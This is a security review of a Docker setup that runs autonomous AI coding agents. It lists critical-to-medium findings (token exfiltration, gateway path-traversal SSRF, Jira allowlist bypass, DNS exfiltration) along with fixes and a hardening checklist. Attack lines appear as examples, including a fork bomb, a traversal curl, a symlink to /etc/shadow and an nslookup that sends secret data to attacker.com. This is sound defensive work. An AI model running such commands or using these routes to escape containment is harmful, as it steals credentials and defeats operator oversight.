# Security Review: Containerized Gas Town

Reviewed 2026-04-03 against the gastown-src Dockerfile, docker-compose.yml,
docker-entrypoint.sh, and the gateway sidecar implementation.

---

## Summary

| Severity | Count | Fixed/Reduced | Remaining |
|----------|-------|---------------|-----------|
| Critical | 2 | 2 | 0* |
| High | 6 | 4 | 2 |
| Medium | 15 | 1 | 14 |
| **Total** | **23** | **7** | **16** |

\* C1 (auth exfiltration) reduced to **Low** when using OAuth (Pro/Max) or
AWS Bedrock — no static secrets to exfiltrate. Remains **High** if using
static API keys.

The containerized setup is **significantly safer than bare-metal** (agents can't
read SSH keys, AWS creds, browser data). But it is not airtight against a
determined adversarial agent with arbitrary code execution inside the container.

**Threat model:** Contain accidents and opportunistic damage from autonomous
agents. Not designed to defend against a sophisticated attacker who has already
achieved code execution inside the container.

---

## Critical

### C1. Claude Auth Token Exfiltration [REDUCED — auth-method dependent]

**Location:** `docker-compose.yml` volume mount

```yaml
- ~/.claude:/home/agent/.claude:ro
```

**Problem (original):** Read-only prevents writes but agents can still *read*
auth credentials and exfiltrate them.

**Actual risk depends on your auth method:**

| Auth Method | Static secrets in `~/.claude/`? | Risk |
|---|---|---|
| Google OAuth (Pro/Max) | No — browser-based, tokens managed by app runtime | **Low** |
| AWS Bedrock | No — short-lived, auto-expire | **Low** |
| API key (`ANTHROPIC_API_KEY`) | Yes — long-lived, plaintext | **High** |

**Google OAuth (Pro/Max):** Authentication is handled via browser-based OAuth
flow. No static API keys or long-lived credentials are stored in `~/.claude/`.
The config files contain settings and preferences, not secrets. Exfiltrating
these files does not grant account access.

**AWS Bedrock:** Credentials are short-lived and expire automatically. Bedrock
creds are passed as environment variables — no host filesystem mounting needed.

**API keys (if used):** The original threat applies in full. A static
`ANTHROPIC_API_KEY` in config or env is a long-lived secret that can be
exfiltrated via HTTP, DNS, or git push.

**Mitigations:**
- Prefer OAuth or Bedrock over static API keys
- If using API keys: rotate regularly, monitor usage, restrict outbound network (see M14)
- Future: Anthropic could support machine-scoped tokens with expiry

---

### C2. Gateway SSRF via Path Traversal [FIXED]

**Location:** `gateway-sidecar/server.py` — all proxy routes

**Original code:**
```python
url=f"https://api.github.com/{api_path}"
```

Where `api_path` came directly from the agent's URL with no validation.

**Attack:**
```bash
# Escape the repo allowlist via path traversal
curl gateway:9999/github/repos/myorg/allowed/../../../../other-org/secret-repo/contents
```

**Impact:** Agents could read/modify any repo the PAT has access to, bypassing
the allowlist entirely.

**Fix applied:** Added `validate_path()` function that rejects:
- `..` (path traversal)
- `//` (path normalization attacks)
- Non-alphanumeric characters (except `/`, `-`, `_`, `.`)
- Paths that differ from their `urllib.parse.normpath()` result

---

## High

### H1. Excessive Linux Capabilities [FIXED]

**Location:** `docker-compose.yml` cap_add

**Original:**
```yaml
cap_add:
  - CHOWN
  - SETUID
  - SETGID
  - DAC_OVERRIDE    # bypasses ALL file permission checks
  - FOWNER          # bypasses file ownership checks
  - NET_RAW         # raw packet crafting, DNS spoofing
```

**Problem:**
- `DAC_OVERRIDE` — agent ignores Unix file permissions, can read any file in
  the container regardless of ownership or mode bits
- `FOWNER` — agent bypasses ownership checks on file operations
- `NET_RAW` — allows raw socket creation for packet spoofing, ARP poisoning,
  DNS cache poisoning within the Docker network

**Fix applied:** Stripped to `CHOWN`, `SETUID`, `SETGID` only.

---

### H2. No Resource Limits [FIXED]

**Location:** `docker-compose.yml` — no deploy.resources section

**Problem:** Zero limits on PIDs, memory, or CPU. An agent could:

```bash
# Fork bomb — exhausts host PIDs, freezes everything
:(){ :|:& };:

# Memory bomb — OOMs the host
python3 -c "x = [' ' * 10**9 for _ in range(100)]"
```

Docker Desktop on macOS shares the host kernel. A runaway container takes down
the whole machine.

**Fix applied:** Added `pids: 512`, `cpus: 4`, `memory: 4G`.

---

### H3. Jira Allowlist Bypass [FIXED]

**Location:** `gateway-sidecar/server.py` — `jira_proxy()`

**Original code:** Only checked for `PROJ-123` regex pattern in the URL. These
endpoints contain no project key and bypass the allowlist:

```bash
curl gateway:9999/jira/myself           # your Jira identity
curl gateway:9999/jira/project          # ALL projects in the instance
curl gateway:9999/jira/users/search     # enumerate all users
curl gateway:9999/jira/permissions      # permission scheme
```

**Impact:** Agents could enumerate all Jira projects, search users, and read
issue metadata across the entire Jira instance.

**Fix applied:**
- Block `admin`, `user`, `permissions`, `role`, `myself`, `serverInfo` segments
- Require a known project key in the path for non-search endpoints
- Check extracted project key against allowlist

---

### H4. No Input Validation on Gateway Request Bodies [FIXED]

**Location:** `gateway-sidecar/server.py` — all proxy routes

**Problem:** Gateway forwarded agent-supplied JSON directly to upstream APIs
with no size check. Agent could send 100MB payload, crashing the gateway (DoS).

**Fix applied:** Added `MAX_PAYLOAD_BYTES = 1MB` check in `before_request`
middleware. Requests exceeding this return 413.

---

### H5. git credential.helper store [REMAINING]

**Location:** `docker-entrypoint.sh`

```bash
git config --global credential.helper store
```

**Problem:** Saves GitHub tokens in plaintext to `~/.git-credentials`:
```
https://x-access-token:ghp_XXXXXXXXXXXXXX@github.com
```

Any agent can `cat ~/.git-credentials` and exfiltrate the token. The file
persists in the Docker volume across restarts.

**Mitigations:**
- Use the gateway git credential helper (`/git/credential` endpoint — fetches token on demand, never on disk)
- Use SSH deploy keys instead of HTTPS tokens
- See README.md "Git Authentication" section

---

### H6. Supply Chain — Unverified Downloads in Dockerfile [REMAINING]

**Location:** `gastown-src/Dockerfile`

```dockerfile
RUN curl -fsSL https://raw.githubusercontent.com/.../install.sh | bash
RUN curl -fsSL https://github.com/dolthub/dolt/.../install.sh | bash
RUN curl -fsSL "https://go.dev/dl/go${GO_VERSION}.linux-${ARCH}.tar.gz" | tar -C /usr/local -xz
```

**Problem:** Downloads install scripts and tarballs over HTTPS and executes
immediately. No checksum verification, no signature validation. If GitHub is
compromised or a corporate proxy performs TLS inspection with certificate
replacement, malicious code gets baked into the image.

**Recommended fix (upstream Dockerfile change):**
```dockerfile
RUN curl -fsSL -o /tmp/install-beads.sh https://raw.githubusercontent.com/.../install.sh \
    && echo "EXPECTED_SHA256  /tmp/install-beads.sh" | sha256sum -c - \
    && bash /tmp/install-beads.sh \
    && rm /tmp/install-beads.sh
```

Also: pin the base image by digest instead of tag:
```dockerfile
FROM docker/sandbox-templates:claude-code@sha256:c21d48be8df3...
```

---

## Medium

### M1. No Read-Only Root Filesystem

Agents can modify system binaries (`/usr/bin/git`, `/usr/local/bin/`), the
entrypoint script, environment setup in `/etc/profile.d/`, or install setuid
backdoors. Changes persist while the container runs (not across rebuilds, but
across restarts if volumes overlap).

**Fix:**
```yaml
read_only: true
tmpfs:
  - /tmp:exec,size=1G
  - /run:size=64M
  - /var/tmp:size=512M
```

---

### M2. No seccomp Profile

Default Docker seccomp allows ~300 syscalls. A custom profile restricting to
the ~50 actually needed would reduce kernel attack surface.

**Fix:** `security_opt: [seccomp=default]` (explicit) or provide a custom
profile.

---

### M3. No AppArmor Profile

No mandatory access control beyond standard Unix permissions. Docker's
`docker-default` AppArmor profile prevents ptrace, kernel module loading, and
sensitive /proc access.

**Fix:** `security_opt: [apparmor=docker-default]` (explicit).

---

### M4. Symlink Traversal in Bind Mounts

An agent creates `ln -s /etc/shadow /gt/rigs/repo/leak`. Docker follows
symlinks on the host side of bind mounts. If the symlink target exists on the
host and is within the bind mount's parent, it's readable.

**Mitigation:** Mount specific rig directories, not broad paths like `~/` or
`~/code/`.

---

### M5. Dashboard Binds to 0.0.0.0

When `IS_SANDBOX=1` (set in compose), `gt dashboard` binds to all interfaces.
Anyone on your LAN can access the dashboard.

**Mitigation:** Docker's port mapping (`"8080:8080"`) defaults to localhost on
the host side. But if the host has Docker configured with `--ip 0.0.0.0`,
the dashboard is exposed to the network.

---

### M6. Dolt Port 3307 Exposure

The original gastown-src compose port-maps Dolt to the host:
```yaml
ports:
  - "3307:3307"
```

Dolt's SQL server has no authentication by default. Anyone on localhost can
query beads data. The containerized/ compose does NOT port-map Dolt (fixed).

---

### M7. No Container-to-Gateway Authentication

Any container on the `gt-net` Docker network can call the gateway without
credentials. If a compromised container joins the network, it gets full access
to all proxied services.

**Mitigation:** Set `GATEWAY_TOKEN` env var. The gateway checks
`Authorization: Bearer <token>` if configured.

---

### M8. No Rate Limiting on Gateway

Agents can hammer GitHub/Jira/Slack APIs, exhausting organization rate limits.
A single agent running a loop could block API access for all users.

**Fix:** Add `flask-limiter`:
```python
from flask_limiter import Limiter
limiter = Limiter(app, default_limits=["100 per minute"])
```

---

### M9. Secrets Potentially in Gateway Logs

The gateway logs method, path, and status code. Response bodies are proxied
back to agents but not logged. However, if debug logging is enabled or Flask
runs in debug mode, request/response bodies including tokens could appear in
logs.

**Mitigation:** Never run Flask in debug mode in production. Don't log request
or response bodies.

---

### M10. Secrets File Permissions Not Enforced

The guide recommends `chmod 600 ~/.gt-secrets/myproject.env` but doesn't
validate permissions before mounting. User error (wrong chmod) silently exposes
secrets.

**Fix:** Add a pre-start check script:
```bash
PERMS=$(stat -f %A "$SECRETS_FILE")
if [ "$PERMS" != "600" ]; then
    echo "ERROR: $SECRETS_FILE must be chmod 600 (found $PERMS)"
    exit 1
fi
```

---

### M11. No Token Rotation Policy

Long-lived tokens (GitHub PATs, Jira API tokens, Slack bot tokens) increase
blast radius. If exfiltrated, they remain valid indefinitely.

**Recommendation:**
- Use fine-grained GitHub PATs with expiration (30-90 days)
- Rotate Jira tokens quarterly
- Document rotation schedule in secrets.env

---

### M12. Plaintext Tokens in .env File

`~/.gt-secrets/*.env` stores tokens in plaintext on the host filesystem. Host
compromise exposes all tokens. Backup tools may capture them.

**Mitigation:** Encrypt at rest with `ansible-vault` or `pass`. Or use a
secrets manager (1Password CLI, HashiCorp Vault).

---

### M13. Untrusted Base Image

`docker/sandbox-templates:claude-code` is not pinned by digest. The tag could
be updated to point to a different image without notice.

**Fix:** Pin by digest:
```dockerfile
FROM docker/sandbox-templates:claude-code@sha256:c21d48be8df3214883bc0bfd628cce0b622369cf6db1f850514c536605da51f2
```

---

### M14. DNS Exfiltration Not Prevented

No DNS filtering. Agents can encode data as DNS queries:
```bash
nslookup $(cat /secret | base64 | tr -d '\n').attacker.com
```

This bypasses all HTTP-level controls.

**Mitigations:**
- Restrict container DNS to internal resolvers only
- Use Docker network policies to block outbound DNS to external servers
- Monitor DNS query logs for high-entropy subdomain patterns

---

### M15. No User Namespace Remapping

Container UID 0 maps to host UID 0. If a container escape occurs (kernel
exploit), the escaped process runs as root on the host.

**Fix:** Enable userns-remap in Docker daemon config:
```json
// /etc/docker/daemon.json
{"userns-remap": "default"}
```

Note: this is a Docker daemon-wide setting, not per-container.

---

## Hardening Checklist

For high-security environments, apply these on top of the default compose:

```yaml
# Add to gastown service:
read_only: true
tmpfs:
  - /tmp:exec,size=1G
  - /run:size=64M
  - /var/tmp:size=512M
security_opt:
  - no-new-privileges:true
  - seccomp=default
  - apparmor=docker-default
```

- [ ] Pin base image by digest (M13)
- [ ] Verify download checksums in Dockerfile (H6)
- [ ] Set `GATEWAY_TOKEN` for container-to-gateway auth (M7)
- [ ] Add rate limiting to gateway (M8)
- [ ] Replace `credential.helper store` with gateway helper (H5)
- [ ] Restrict outbound DNS (M14)
- [ ] Enable user namespace remapping (M15)
- [ ] Set token rotation schedule (M11)
- [ ] Encrypt secrets file at rest (M12)
- [ ] Validate secrets file permissions before start (M10)
